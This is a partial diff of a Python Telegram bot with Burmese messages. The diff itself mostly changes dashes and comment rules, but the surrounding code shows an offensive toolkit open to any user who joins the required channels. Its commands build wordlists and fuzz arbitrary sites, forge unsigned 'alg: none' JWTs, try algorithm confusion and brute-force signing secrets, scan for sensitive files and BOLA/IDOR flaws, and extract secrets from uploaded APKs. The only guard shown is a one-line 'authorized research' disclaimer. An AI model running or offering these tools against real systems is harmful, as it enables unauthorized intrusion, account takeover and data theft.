     return db.get("settings", {}).get("force_channels", [])
@@ -8522,13 +8773,13 @@ async def check_force_join(update: Update, context) -> bool:
     """
     uid = update.effective_user.id
     if uid in ADMIN_IDS:
-        return True  # Admin   always free
+        return True  # Admin — always free
 
     async with db_lock:
         db = _load_db_sync()
     channels = await _get_force_channels(db)
     if not channels:
-        return True  # No force join configured   allow all
+        return True  # No force join configured — allow all
 
     not_joined = []
     for ch in channels:
@@ -8548,7 +8799,7 @@ async def check_force_join(update: Update, context) -> bool:
         label = ch if ch.startswith('@') else "Channel"
         invite_link = ch if ch.startswith('@') else ch
         kb.append([InlineKeyboardButton(f"📢 {label} ကို Join လုပ်ပါ", url=f"https://t.me/{invite_link.lstrip('@')}")])
-    kb.append([InlineKeyboardButton("✅ Join ပြီး   စစ်ဆေးပါ", callback_data="fj_check")])
+    kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
 
     await update.effective_message.reply_text(
         "🔒 *Bot ကို သုံးရန် Channel Join လုပ်ရပါမည်*\n\n"
@@ -8561,7 +8812,7 @@ async def check_force_join(update: Update, context) -> bool:
 
 
 async def force_join_callback(update: Update, context) -> None:
-    """Callback for '✅ Join ပြီး - စစ်ဆေးပါ' button"""
+    """Callback for '✅ Join ပြီး — စစ်ဆေးပါ' button"""
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
@@ -8588,7 +8839,7 @@ async def force_join_callback(update: Update, context) -> None:
                 parse_mode='Markdown'
             )
         except BadRequest:
-            pass  # Message already same content   ignore
+            pass  # Message already same content — ignore
     else:
         kb = []
         for ch in not_joined:
@@ -8596,7 +8847,7 @@ async def force_join_callback(update: Update, context) -> None:
                 f"📢 {ch} ကို Join လုပ်ပါ",
                 url=f"https://t.me/{ch.lstrip('@')}"
             )])
-        kb.append([InlineKeyboardButton("✅ Join ပြီး   စစ်ဆေးပါ", callback_data="fj_check")])
+        kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
         new_text = (
             "❌ *မပြည့်စုံသေးပါ*\n\n"
             "အောက်ပါ channel(s) ကို မဖြစ်မနေ Join ပါ:\n\n"
@@ -8609,8 +8860,8 @@ async def force_join_callback(update: Update, context) -> None:
                 parse_mode='Markdown'
             )
         except BadRequest:
-            # Message not modified (same channels)   just answer silently
-            await query.answer("မပြည့်စုံသေးပါ   Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)
+            # Message not modified (same channels) — just answer silently
+            await query.answer("မပြည့်စုံသေးပါ — Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)
 
 
 async def appassets_cat_callback(update: Update, context) -> None:
@@ -8638,7 +8889,7 @@ async def appassets_cat_callback(update: Update, context) -> None:
 
     if not last_app or not os.path.exists(last_app):
         await query.edit_message_text(
-            "⚠️ ဖိုင် မတွေ့တော့ပါ   APK/IPA/ZIP ကို ထပ် upload ပါ"
+            "⚠️ ဖိုင် မတွေ့တော့ပါ — APK/IPA/ZIP ကို ထပ် upload ပါ"
         )
         return
 
@@ -8660,9 +8911,9 @@ async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📢 *Force Join Settings*\n\n"
             f"လက်ရှိ channels: `{'None' if not chs else ', '.join(chs)}`\n\n"
             "Usage:\n"
-            "`/setforcejoin @mychannel`   Channel တစ်ခု set\n"
-            "`/setforcejoin @ch1 @ch2`   Channel နှစ်ခု\n"
-            "`/setforcejoin off`   ပိတ်မည်\n\n"
+            "`/setforcejoin @mychannel` — Channel တစ်ခု set\n"
+            "`/setforcejoin @ch1 @ch2` — Channel နှစ်ခု\n"
+            "`/setforcejoin off` — ပိတ်မည်\n\n"
             "⚠️ Bot ကို Channel admin ထဲ ထည့်ထားဖို့ မမေ့ပါနဲ့",
             parse_mode='Markdown'
         )
@@ -8688,9 +8939,9 @@ async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ==================================================
-# 📦  FEATURE 9   Advanced APK Asset Extractor (/appassets)
-# ==================================================
+# ══════════════════════════════════════════════════
+# 📦  FEATURE 9 — Advanced APK Asset Extractor (/appassets)
+# ══════════════════════════════════════════════════
 
 _ASSET_CATEGORIES = {
     "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
@@ -8760,9 +9011,9 @@ def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) 
     return result
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 📱  APP / APK / IPA / ZIP ANALYZER (Enhanced v2.0)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 class APKMetadataExtractor:
     """AndroidManifest.xml ကနေ အသုံးဝင်သောအချက်အလက် ကောက်ယူခြင်း"""
@@ -8866,9 +9117,9 @@ class APKMetadataExtractor:
         return certs
 
 
-# ==========================================================================
-# 2️⃣  BINARY STRING EXTRACTION   DEX ထဲက Strings
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
+# 2️⃣  BINARY STRING EXTRACTION — DEX ထဲက Strings
+# ══════════════════════════════════════════════════════════════════════════
 
 class BinaryStringExtractor:
     """DEX ဖိုင်ထဲက အဓိက string တွေ ကောက်ယူခြင်း"""
@@ -8994,9 +9245,9 @@ class BinaryStringExtractor:
         return strings
 
 
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 # 3️⃣  PERMISSION RISK ANALYSIS
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 
 class PermissionRiskAnalyzer:
     """ခွင့်ခြင်းများ၏ အန္တရာယ်ကို အဆင့်ခွဲခြည်း"""
@@ -9100,9 +9351,9 @@ class PermissionRiskAnalyzer:
         return result
 
 
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 # 4️⃣  FILE STRUCTURE ANALYSIS
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 
 class APKFileAnalyzer:
     """APK ထဲက ဖိုင်အမျိုးအစားများ ခွဲခွာခြည်း"""
@@ -9196,9 +9447,9 @@ class APKFileAnalyzer:
         return result
 
 
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 # 5️⃣  MAIN ANALYSIS ENGINE
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 
 def analyze_apk_enhanced(apk_path: str, progress_callback: Callable = None) -> Dict:
     """အသုံးဝင်သောအချက်အလက် များများ APK analysis"""
@@ -9264,22 +9515,22 @@ def analyze_apk_enhanced(apk_path: str, progress_callback: Callable = None) -> D
     return final_result
 
 
-# ==========================================================================
-# 📱 INTEGRATION GUIDE   Bot ထဲတွင် အဖွဲ့ခွဲခြင်း
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
+# 📱 INTEGRATION GUIDE — Bot ထဲတွင် အဖွဲ့ခွဲခြင်း
+# ══════════════════════════════════════════════════════════════════════════
 
 
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 # 🧪 TESTING & CLI USAGE
-# ==========================================================================
+# ══════════════════════════════════════════════════════════════════════════
 
 
-# --------------------------------------------------
+# ──────────────────────────────────────────────────
 # Compatibility wrapper for existing code
-# --------------------------------------------------
+# ──────────────────────────────────────────────────
 
 def analyze_app_file(filepath: str, progress_cb=None) -> dict:
-    """APK analysis - enhanced version with full compatibility"""
+    """APK analysis — enhanced version with full compatibility"""
     try:
         result = analyze_apk_enhanced(filepath, progress_cb)
         
@@ -9322,7 +9573,7 @@ def analyze_app_file(filepath: str, progress_cb=None) -> dict:
 
 
 async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/appassets - Extract specific asset types from uploaded APK/IPA/ZIP"""
+    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
     uid = update.effective_user.id
 
     # Force join check
@@ -9346,18 +9597,18 @@ async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
             "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
             "Extract လုပ်နိုင်သော Category များ:\n"
-            "🖼 `images`   PNG, JPG, SVG, WebP\n"
-            "🎵 `audio`   MP3, WAV, OGG, AAC\n"
-            "🎬 `video`   MP4, WebM, MKV\n"
-            "📐 `layouts`   XML Layout files\n"
-            "⚙️ `dex`   classes.dex (bytecode)\n"
-            "🔧 `so_libs`   .so Native libraries\n"
-            "🔤 `fonts`   TTF, OTF, WOFF\n"
-            "🔒 `certs`   PEM, CER, Keystores\n"
-            "📋 `configs`   JSON, YAML, Properties\n"
-            "📝 `scripts`   JS, Python, Shell\n"
-            "📄 `docs`   PDF, TXT, HTML\n"
-            "🗜 `archives`   ZIP, TAR, GZ",
+            "🖼 `images` — PNG, JPG, SVG, WebP\n"
+            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
+            "🎬 `video` — MP4, WebM, MKV\n"
+            "📐 `layouts` — XML Layout files\n"
+            "⚙️ `dex` — classes.dex (bytecode)\n"
+            "🔧 `so_libs` — .so Native libraries\n"
+            "🔤 `fonts` — TTF, OTF, WOFF\n"
+            "🔒 `certs` — PEM, CER, Keystores\n"
+            "📋 `configs` — JSON, YAML, Properties\n"
+            "📝 `scripts` — JS, Python, Shell\n"
+            "📄 `docs` — PDF, TXT, HTML\n"
+            "🗜 `archives` — ZIP, TAR, GZ",
             parse_mode='Markdown'
         )
         return
@@ -9397,7 +9648,7 @@ async def _do_appassets_extract(update, context, filepath: str, wanted_cats: set
     import io
     fname = os.path.basename(filepath)
     msg = await update.effective_message.reply_text(
-        f"📦 *Asset Extractor   `{fname}`*\n\n"
+        f"📦 *Asset Extractor — `{fname}`*\n\n"
         f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
         "⏳ Extracting...",
         parse_mode='Markdown'
@@ -9473,7 +9724,7 @@ async def _do_appassets_extract(update, context, filepath: str, wanted_cats: set
             document=zip_buf,
             filename=zip_name,
             caption=(
-                f"📦 *APK Assets   `{os.path.basename(filepath)}`*\n"
+                f"📦 *APK Assets — `{os.path.basename(filepath)}`*\n"
                 f"📂 `{extracted}` files extracted\n"
                 f"💾 `{zip_size_mb:.2f}` MB\n"
                 f"Categories: `{', '.join(sorted(wanted_cats))}`"
@@ -9484,8 +9735,8 @@ async def _do_appassets_extract(update, context, filepath: str, wanted_cats: set
         await update.effective_message.reply_text(f"❌ Upload error: `{e}`", parse_mode='Markdown')
 
 
-# ==================================================
-# ==================================================
+# ══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════
 
 _SMARTFUZZ_STOP_WORDS = {
     'the','a','an','in','on','at','for','of','to','is','are','was','were',
@@ -9506,7 +9757,7 @@ def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
 
     all_words = set()
 
-    # -- Scrape homepage + up to 3 internal pages --
+    # ── Scrape homepage + up to 3 internal pages ──
     try:
         r = requests.get(url, headers=_get_headers(), timeout=12, verify=False)
         soup = BeautifulSoup(r.text, 'html.parser')
@@ -9571,7 +9822,7 @@ def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
     if progress_cb:
         progress_cb(f"📝 Raw words: `{len(raw_words)}`")
 
-    # -- Generate permutations ----------------------
+    # ── Generate permutations ──────────────────────
     current_year = datetime.now().year
     years        = [str(y) for y in range(current_year - 3, current_year + 2)]
     suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
@@ -9673,22 +9924,22 @@ def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> li
         except concurrent.futures.TimeoutError:
             for f in fmap: f.cancel()
             if progress_cb:
-                progress_cb(f"⚠️ Timeout   partial: `{done}/{len(wordlist)}`")
+                progress_cb(f"⚠️ Timeout — partial: `{done}/{len(wordlist)}`")
 
     found.sort(key=lambda x: (x['status'] != 200, x['status']))
     return found
 
 
 async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/smartfuzz <url> - Context-aware wordlist builder + fuzzer"""
+    """/smartfuzz <url> — Context-aware wordlist builder + fuzzer"""
     if not await check_force_join(update, context):
         return
 
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
-            "🗂️ *Smart Fuzzer   3 Phases:*\n\n"
-            "① *Context Harvesting*   Target ကို scrape ပြီး\n"
+            "🗂️ *Smart Fuzzer — 3 Phases:*\n\n"
+            "① *Context Harvesting* — Target ကို scrape ပြီး\n"
             "   Company name, product name, developer identifiers,\n"
             "   JS variables, class/ID names, meta keywords\n"
             "   တွေကို ဆုပ်ကိုင်ပါမည်\n\n"
@@ -9723,7 +9974,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).netloc
     base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
     msg = await update.effective_message.reply_text(
-        f"🗂️ *Smart Fuzzer   `{domain}`*\n\n"
+        f"🗂️ *Smart Fuzzer — `{domain}`*\n\n"
         "① Harvesting words from target...\n"
         "② Building custom wordlist...\n"
         "③ Fuzzing...\n\n⏳",
@@ -9742,7 +9993,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if progress_q: progress_q.clear()
             try:
                 await msg.edit_text(
-                    f"🗂️ *SmartFuzz   `{domain}`*\n\n{spin} {txt}", parse_mode='Markdown')
+                    f"🗂️ *SmartFuzz — `{domain}`*\n\n{spin} {txt}", parse_mode='Markdown')
             except Exception:
                 pass
 
@@ -9753,7 +10004,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         if not wordlist:
             prog.cancel()
-            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ   site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
+            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ — site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
             return
 
         progress_q.append(f"✅ Wordlist: `{len(wordlist)}` words\n🧪 Fuzzing နေပါသည်...")
@@ -9768,15 +10019,15 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         prog.cancel()
 
-    # -- Summary -----------------------------------
+    # ── Summary ───────────────────────────────────
     hits_200   = [f for f in found if f['status'] == 200]
     hits_auth  = [f for f in found if f['status'] in (401, 403)]
     hits_redir = [f for f in found if f['status'] in (301, 302)]
     hits_err   = [f for f in found if f['status'] == 500]
 
     lines = [
-        f"🗂️ *SmartFuzz Results   `{domain}`*",
-        "--------------------",
+        f"🗂️ *SmartFuzz Results — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📝 Words scraped: `{len(raw_words)}`",
         f"🎯 Wordlist generated: `{len(wordlist)}`",
         f"🔍 Total probed: `{len(wordlist)}`",
@@ -9785,7 +10036,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
 
     if hits_200:
-        lines.append(f"*✅ HTTP 200   Accessible ({len(hits_200)}):*")
+        lines.append(f"*✅ HTTP 200 — Accessible ({len(hits_200)}):*")
         for h in hits_200[:15]:
             lines.append(f"  🟢 `/{h['word']}` → `{h['size']}B`")
         lines.append("")
@@ -9822,7 +10073,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
 
-    # -- Export wordlist + results as ZIP ---------
+    # ── Export wordlist + results as ZIP ─────────
     import io, zipfile as _zf
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_d = re.sub(r'[^\w\-]', '_', domain)
@@ -9846,7 +10097,7 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
             document=zip_buf,
             filename=f"smartfuzz_{safe_d}_{ts}.zip",
             caption=(
-                f"🗂️ *SmartFuzz Export   `{domain}`*\n"
+                f"🗂️ *SmartFuzz Export — `{domain}`*\n"
                 f"📝 Wordlist: `{len(wordlist)}` | Found: `{len(found)}`\n"
                 "Files: `wordlist.txt` + `raw_words.txt` + `results.json`"
             ),
@@ -9856,9 +10107,9 @@ async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.warning("SmartFuzz export error: %s", e)
 
 
-# ==================================================
-# 🎟️  FEATURE 12   Advanced JWT Attacker & Cracker (/jwtattack)
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🎟️  FEATURE 12 — Advanced JWT Attacker & Cracker (/jwtattack)
+# ══════════════════════════════════════════════════
 
 import base64 as _b64
 
@@ -9893,7 +10144,7 @@ def _jwt_decode_payload(token: str) -> dict:
 
 
 def _jwt_none_attack(token: str) -> dict:
-    """None algorithm bypass - forge unsigned token."""
+    """None algorithm bypass — forge unsigned token."""
     parts = token.split('.')
     if len(parts) != 3:
         return {"success": False}
@@ -9910,14 +10161,14 @@ def _jwt_none_attack(token: str) -> dict:
             "original_alg": orig_alg,
             "forged_token":  forged,
             "method": "none_alg_bypass",
-            "note": "Signature removed   send with empty sig. Some servers accept this."
+            "note": "Signature removed — send with empty sig. Some servers accept this."
         }
     except Exception as e:
         return {"success": False, "error": str(e)}
 
 
 def _jwt_alg_confusion(token: str) -> dict:
-    """Algorithm confusion - RS256→HS256 concept (no public key needed for demo)."""
+    """Algorithm confusion — RS256→HS256 concept (no public key needed for demo)."""
     parts = token.split('.')
     if len(parts) != 3:
         return {"success": False}
@@ -9989,7 +10240,7 @@ def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dic
 
 
 async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/jwtattack <token> - Decode, attack, and crack JWT tokens"""
+    """/jwtattack <token> — Decode, attack, and crack JWT tokens"""
     if not await check_force_join(update, context):
         return
 
@@ -9997,10 +10248,10 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(
             "📌 *Usage:* `/jwtattack <token>`\n\n"
             "🎟️ *JWT Attack Phases:*\n\n"
-            "① *Decode*   Header + Payload reveal\n"
+            "① *Decode* — Header + Payload reveal\n"
             "   Algorithm, expiry, user roles, claims\n\n"
             "② *None Algorithm Bypass*\n"
-            "   `alg: none`   unsigned token forge\n\n"
+            "   `alg: none` — unsigned token forge\n\n"
             "③ *Algorithm Confusion*\n"
             "   RS256 → HS256 confusion attack\n\n"
             "④ *Secret Key Brute-force*\n"
@@ -10041,7 +10292,7 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for i, part in enumerate(parts[:2]):
         if len(part) < 4:
             await update.effective_message.reply_text(
-                f"❌ JWT part {i+1} တိုလွန်းနေသည်   Valid token ထည့်ပါ",
+                f"❌ JWT part {i+1} တိုလွန်းနေသည် — Valid token ထည့်ပါ",
                 parse_mode='Markdown'
             )
             return
@@ -10052,7 +10303,7 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-    # -- Phase 1: Decode --------------------------
+    # ── Phase 1: Decode ──────────────────────────
     decoded = _jwt_decode_payload(token)
     if "error" in decoded:
         await msg.edit_text(f"❌ Decode error: `{decoded['error']}`", parse_mode='Markdown')
@@ -10085,13 +10336,13 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     payload_str = _fmt_payload(payload)
 
-    # -- Phase 2: None attack ---------------------
+    # ── Phase 2: None attack ─────────────────────
     none_res = _jwt_none_attack(token)
 
-    # -- Phase 3: Alg confusion -------------------
+    # ── Phase 3: Alg confusion ───────────────────
     alg_res = _jwt_alg_confusion(token)
 
-    # -- Phase 4: Brute-force (in thread) ---------
+    # ── Phase 4: Brute-force (in thread) ─────────
     progress_q = []
 
     _spin_i = [0]
@@ -10118,10 +10369,10 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         prog.cancel()
 
-    # -- Build report -----------------------------
+    # ── Build report ─────────────────────────────
     lines = [
         "🎟️ *JWT Attack Report*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
         "*① Decoded Token:*",
         f"  Algorithm: `{alg}`",
@@ -10136,7 +10387,7 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines.append("*② None Algorithm Bypass:*")
     if none_res.get("success"):
         forged = none_res['forged_token']
-        lines.append("  ✅ *VULNERABLE   unsigned token forged!*")
+        lines.append("  ✅ *VULNERABLE — unsigned token forged!*")
         lines.append(f"  Original alg: `{none_res['original_alg']}`")
         lines.append(f"  Forged token (truncated):\n  `{forged[:80]}...`")
         lines.append(f"  _{none_res.get('note','')}_")
@@ -10167,7 +10418,7 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lines.append(f"  ✅ Not cracked (`{bf_res.get('tried',0)}` common secrets tried)")
         lines.append("  _Custom wordlist ဖြင့် ထပ်ကြိုးစားနိုင်သည်_")
     lines.append("")
-    lines.append("------------------")
+    lines.append("━━━━━━━━━━━━━━━━━━")
     lines.append("⚠️ _Authorized security research only_")
 
     report = "\n".join(lines)
@@ -10196,20 +10447,20 @@ async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id=update.effective_chat.id,
             document=report_buf,
             filename=f"jwt_report_{ts}.json",
-            caption="🎟️ *JWT Full Report*   JSON export",
+            caption="🎟️ *JWT Full Report* — JSON export",
             parse_mode='Markdown'
         )
     except Exception as e:
         logger.warning("JWT export error: %s", e)
 
 
-# ==================================================
-# 🤖  BOT   USER COMMANDS
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🤖  BOT — USER COMMANDS
+# ══════════════════════════════════════════════════
 
 
 async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/mystats - Detailed personal statistics"""
+    """/mystats — Detailed personal statistics"""
     uid = update.effective_user.id
     async with db_lock:
         db = _load_db_sync()
@@ -10255,20 +10506,20 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid   = update.effective_user.id
     uname = update.effective_user.first_name or "User"
 
-    # -- Force join check -------------------------
+    # ── Force join check ─────────────────────────
     if not await check_force_join(update, context):
         return
 
-    # -- File type check --------------------------
+    # ── File type check ──────────────────────────
     fname    = doc.file_name or ""
     ext      = os.path.splitext(fname.lower())[1]
     fsize_mb = doc.file_size / 1024 / 1024 if doc.file_size else 0
 
     if ext not in _APP_EXTS:
-        # Not an app file   ignore silently
+        # Not an app file — ignore silently
         return
 
-    # -- Size limit -------------------------------
+    # ── Size limit ───────────────────────────────
     if fsize_mb > APP_MAX_MB:
         await update.message.reply_text(
             f"⚠️ File ကြီးလွန်းတယ် (`{fsize_mb:.1f}MB`)\n"
@@ -10277,7 +10528,7 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # -- Rate limit -------------------------------
+    # ── Rate limit ───────────────────────────────
     allowed, wait = check_rate_limit(uid)
     if not allowed:
         await update.message.reply_text(f"⏱️ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
@@ -10286,14 +10537,14 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_type = _APP_EXTS.get(ext, ext.upper())
     msg = await update.message.reply_text(
         f"📱 *{file_type} Detected!*\n"
-        f"--------------------\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
         f"📄 `{fname}`\n"
         f"💾 `{fsize_mb:.1f} MB`\n\n"
         f"⬇️ Downloading from Telegram...",
         parse_mode='Markdown'
     )
 
-    # -- Download file from Telegram --------------
+    # ── Download file from Telegram ──────────────
     work_dir  = os.path.join(APP_ANALYZE_DIR, str(uid))
     os.makedirs(work_dir, exist_ok=True)
     safe_name = re.sub(r'[^\w\.\-]', '_', fname)
@@ -10306,7 +10557,7 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ Download error: `{type(e).__name__}`", parse_mode='Markdown')
         return
 
-    # -- Save path for /appassets command ---------
+    # ── Save path for /appassets command ─────────
     async with db_lock:
         db2 = _load_db_sync()
         u2  = get_user(db2, uid, uname)
@@ -10314,8 +10565,8 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _save_db_sync(db2)
 
     await msg.edit_text(
-        f"📱 *{file_type}   `{fname}`*\n"
-        f"--------------------\n"
+        f"📱 *{file_type} — `{fname}`*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
         f"✅ Downloaded `{fsize_mb:.1f}MB`\n\n"
         f"🔍 Phase 1: Text/Source scanning...\n"
         f"📦 Phase 2: Binary string extraction...\n"
@@ -10324,7 +10575,7 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-    # -- Progress tracking -------------------------
+    # ── Progress tracking ─────────────────────────
     prog_q = []
     async def _prog_loop():
         while True:
@@ -10355,13 +10606,13 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         prog_task.cancel()
 
-    # -- Cleanup downloaded file -------------------
+    # ── Cleanup downloaded file ───────────────────
     try:
         os.remove(save_path)
     except Exception as _e:
         logging.debug("Scan error: %s", _e)
 
-    # == Build result report =======================
+    # ══ Build result report ═══════════════════════
     app_info = result.get("app_info", {})
     urls     = result.get("urls", [])
     api_paths= result.get("api_paths", [])
@@ -10371,13 +10622,13 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats    = result.get("stats", {})
     errors   = result.get("errors", [])
 
-    # -- Platform badge ----------------------------
+    # ── Platform badge ────────────────────────────
     platform = app_info.get("platform", "")
     plat_icon = "🤖" if platform == "Android" else ("🍎" if platform == "iOS" else "📦")
 
     lines = [
-        f"📱 *App Analysis   `{fname}`*",
-        "--------------------",
+        f"📱 *App Analysis — `{fname}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"{plat_icon} `{result['file_type']}` | 💾 `{result['file_size_mb']}MB`",
         f"📂 Files: `{stats.get('total_files',0)}` | Scanned: `{stats.get('text_files_scanned',0)}`",
         f"🌐 URLs: `{stats.get('unique_urls',0)}` | 🛤 API Paths: `{stats.get('api_paths',0)}`",
@@ -10463,17 +10714,17 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
             tags = []
             if sf["urls"] > 0:   tags.append(f"{sf['urls']} URLs")
             if sf["secrets"]:    tags.append(f"🔑 {','.join(sf['secrets'][:2])}")
-            lines.append(f"  📝 `{fname_short}`   {' | '.join(tags)}")
+            lines.append(f"  📝 `{fname_short}` — {' | '.join(tags)}")
         lines.append("")
 
     if errors:
         lines.append(f"⚠️ _Errors: {len(errors)}_")
 
-    lines.append("⚠️ _Passive analysis only   no exploitation_")
+    lines.append("⚠️ _Passive analysis only — no exploitation_")
 
     report_text = "\n".join(lines)
 
-    # -- Send text report --------------------------
+    # ── Send text report ──────────────────────────
     try:
         if len(report_text) <= 4000:
             await msg.edit_text(report_text, parse_mode='Markdown')
@@ -10483,7 +10734,7 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.message.reply_text(report_text[:4000], parse_mode='Markdown')
 
-    # -- Export full JSON report -------------------
+    # ── Export full JSON report ───────────────────
     try:
         safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(fname)[0])
         ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -10529,35 +10780,35 @@ async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_sensitive(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/sensitive <url> - Brute-force sensitive files"""
+    """/sensitive <url> — Brute-force sensitive files"""
     if not await check_force_join(update, context): return
     if not context.args: return await update.effective_message.reply_text("Usage: `/sensitive <url>`")
     url = context.args[0]
     if not url.startswith('http'): url = 'https://' + url
-    msg = await update.effective_message.reply_text(f"📂 *Sensitive File Scan   `{urlparse(url).hostname}`*\n⏳ Checking 30+ paths...", parse_mode='Markdown')
+    msg = await update.effective_message.reply_text(f"📂 *Sensitive File Scan — `{urlparse(url).hostname}`*\n⏳ Checking 30+ paths...", parse_mode='Markdown')
     res = await asyncio.to_thread(_do_sensitive_scan_sync, url)
     found = res.get("found", [])
-    lines = [f"📂 *Sensitive Files   `{urlparse(url).hostname}`*", "--------------------"]
+    lines = [f"📂 *Sensitive Files — `{urlparse(url).hostname}`*", "━━━━━━━━━━━━━━━━━━━━"]
     if found:
         for f in found: lines.append(f"🔴 `{f['path']}` ({f['size']} bytes)")
     else: lines.append("✅ No sensitive files found.")
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 async def cmd_bola(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/bola <url> - Test for BOLA/IDOR"""
+    """/bola <url> — Test for BOLA/IDOR"""
     if not await check_force_join(update, context): return
     if not context.args: return await update.effective_message.reply_text("Usage: `/bola <url>`")
     url = context.args[0]
     if not url.startswith('http'): url = 'https://' + url
-    msg = await update.effective_message.reply_text(f"🔌 *BOLA/IDOR Scan   `{urlparse(url).hostname}`*\n⏳ Discovering APIs first...", parse_mode='Markdown')
+    msg = await update.effective_message.reply_text(f"🔌 *BOLA/IDOR Scan — `{urlparse(url).hostname}`*\n⏳ Discovering APIs first...", parse_mode='Markdown')
     api_res = await asyncio.to_thread(discover_api_endpoints, url, lambda t: None)
     endpoints = api_res.get("found", [])
     if not endpoints:
         return await msg.edit_text("❌ No API endpoints found to test BOLA.")
